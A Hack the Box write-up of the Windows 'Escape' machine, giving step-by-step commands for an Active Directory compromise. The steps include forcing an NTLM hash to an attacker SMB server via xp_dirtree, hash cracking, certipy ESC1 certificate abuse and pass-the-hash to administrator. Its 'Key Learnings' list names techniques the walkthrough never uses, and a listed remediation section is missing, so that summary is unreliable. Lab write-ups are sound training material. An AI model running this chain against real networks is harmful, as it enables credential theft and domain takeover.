# Escape

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="908" height="1119" alt="image" src="https://github.com/user-attachments/assets/1123e9e1-11b9-4908-923e-6f39559bae3a" />

2. Our goal is to first get user credentials, preferrably a domain user, to get an initial foothold into the network. The 2 most common attack vectors to achieve that are web servers and SMB. Since there is no open web server, we try anonymously logging into SMB, which shows there is a Public share we can access. We retrieve the SQL pdf from there

`smbclient -N //sequel.htb/Public`

<img width="698" height="390" alt="image" src="https://github.com/user-attachments/assets/a967fe42-4bad-4075-a554-0b4fd55ac9e4" />

3. Opening the PDF file gives us credentials to the PublicUser user.

<img width="847" height="141" alt="image" src="https://github.com/user-attachments/assets/f632ce76-0aee-48b8-a59a-2b8244128409" />

4. Login as PublicUser to the SQL Server

`impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb`

<img width="659" height="203" alt="image" src="https://github.com/user-attachments/assets/9bbc5213-0302-46b6-88a5-64fa603598cd" />

5. Enumerating the databases yields no data so we try command execution via the xp_cmdshell stored procedure. This is blocked as well; however, the xp_dirtree is executable as Guest user. We use xp_dirtree to connect to our SMB server hosted on our attacker machine to see if we can get a user hash. This works beautifully!

Start local SMB server using impacket
`impacket-smbserver -smb2support share ~/htb/escape/recon/share`

Connect to our SMB server using xp_dirtree
`exec xp_dirtree '\\10.10.15.30\share',1,1;`

<img width="911" height="330" alt="image" src="https://github.com/user-attachments/assets/5885e520-85e1-4d3d-8441-3ec04d40ccc3" />

6. Crack hash offline using hashcat and we get sql_svc's plaintext password!

`hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt`

7. Turns out, sql_svc has PSRemote privileges to the DC. So, we can evil-winrm into the machine.

`evil-winrm -i 10.129.228.253 -u sql_svc -p $(cat sql_svc.pass)`

<img width="909" height="84" alt="image" src="https://github.com/user-attachments/assets/dc6baf01-6dd2-4cdd-85a2-21be1177a183" />

8. After enumerating the machine, we find a SQLServer log file that contains a failed login attempt for the user Ryan.Cooper, which shows the user's password in the next line.

<img width="910" height="312" alt="image" src="https://github.com/user-attachments/assets/663b6228-bc0a-4d62-8fcb-c40290dbfcc8" />

9. We log into the machine again via evil-winrm with ryan.cooper's credentials and we get the user flag!

`evil-winrm -i sequel.htb -u ryan.cooper -p $(cat ryan.cooper.pass)`

<img width="494" height="214" alt="image" src="https://github.com/user-attachments/assets/42626ecb-9042-4fa0-9328-eb050482678b" />

10. We do basic enumeration on the user and we find that ryan.cooper has membership in the Certificate Service DCOM Access group. Getting the description to this group shows that this user is allowed to connect to the Certificate Authority.

`whoami /groups`

`net localgroup "Certificate Service DCOM Access`

<img width="912" height="586" alt="image" src="https://github.com/user-attachments/assets/0e83bdb1-a788-4740-9d43-261b095f68ee" />

11. Using certipy, we look for vulnerable certificate templates user ryan.cooper can exploit

`certipy find -u ryan.cooper -p $(cat ../user/ryan.cooper.pass) -dc-ip 10.129.228.253 -target dc.sequel.htb -enabled -vulnerable`

<img width="898" height="736" alt="image" src="https://github.com/user-attachments/assets/99856e15-392a-415b-8e4c-f52c84673ed0" />

12. Using certipy again, we exploit the ESC1 template vulnerability to get a certificate with the administrator's UPN

`certipy req -ca 'sequel-DC-CA' -dc-ip 10.129.228.253 -u ryan.cooper -p $(cat ../user/ryan.cooper.pass) -template UserAuthentication -target dc.sequel.htb -upn 'administrator@sequel.htb'`

13. Using the certificate, we get the NTLM hash for the administrator account

`certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253`

14. Lastly, we perform a Pass the Hash attack to login as administrator and get the root flag!

`evil-winrm -i sequel.htb -u administrator -H $(cat administrator.hash)`
